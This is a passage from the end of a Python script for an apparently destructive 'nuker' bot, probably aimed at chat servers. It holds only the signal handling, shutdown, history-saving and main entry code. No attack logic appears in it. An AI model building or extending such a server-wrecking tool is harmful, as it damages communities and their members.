            print(f"\n{Fore.YELLOW}[!] Received {signal_name}, shutting down gracefully...{Style.RESET_ALL}")
            
            # Cancel ongoing operations
            if nuker_instance:
                nuker_instance.cancel_operations()
                # Save history and statistics
                try:
                    nuker_instance.operation_history.save_history(force=True)
                    nuker_instance._save_statistics()
                    logger.info("History and statistics saved successfully")
                except Exception as e:
                    logger.error(f"Error saving data on shutdown: {e}", exc_info=True)
            
            # Close bot connection
            try:
                if nuker_instance and nuker_instance.bot:
                    asyncio.create_task(nuker_instance.bot.close())
            except Exception as e:
                logger.error(f"Error closing bot on shutdown: {e}", exc_info=True)
            
            sys.exit(0)
        
        # Register signal handlers (Unix/Linux/macOS)
        if hasattr(signal, 'SIGINT'):
            signal.signal(signal.SIGINT, signal_handler)
        if hasattr(signal, 'SIGTERM'):
            signal.signal(signal.SIGTERM, signal_handler)
        # Note: SIGBREAK is Windows-specific, handled differently
    
    # Setup signal handlers
    setup_signal_handlers(nuker)
    
    # Use async context manager for proper resource management
    try:
        async with nuker.bot:
            await nuker.run()
    except KeyboardInterrupt:
        logger.info("Keyboard interrupt received, shutting down...")
        print(f"\n{Fore.YELLOW}[!] Interrupted by user, shutting down...{Style.RESET_ALL}")
        nuker.cancel_operations()
        nuker.operation_history.save_history(force=True)
        nuker._save_statistics()
    except Exception as e:
        print(f"{Fore.RED}[!] Error running bot: {e}")
        logger.error(f"Error running bot: {e}", exc_info=True)
        print(f"{Fore.YELLOW}[*] Press any key to exit...")
        input()
    finally:
        # Flush history and save statistics on exit
        if 'nuker' in locals() and nuker:
            try:
                nuker.operation_history.save_history(force=True)
                nuker._save_statistics()
                logger.info("Final save completed on exit")
            except Exception as e:
                logger.error(f"Error in final save: {e}", exc_info=True)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Interrupted by user")
        input("Press Enter to exit...")
    except Exception as e:
        print(f"{Fore.RED}[!] Fatal error: {e}")
        import traceback
        traceback.print_exc()
        input("Press Enter to exit...")

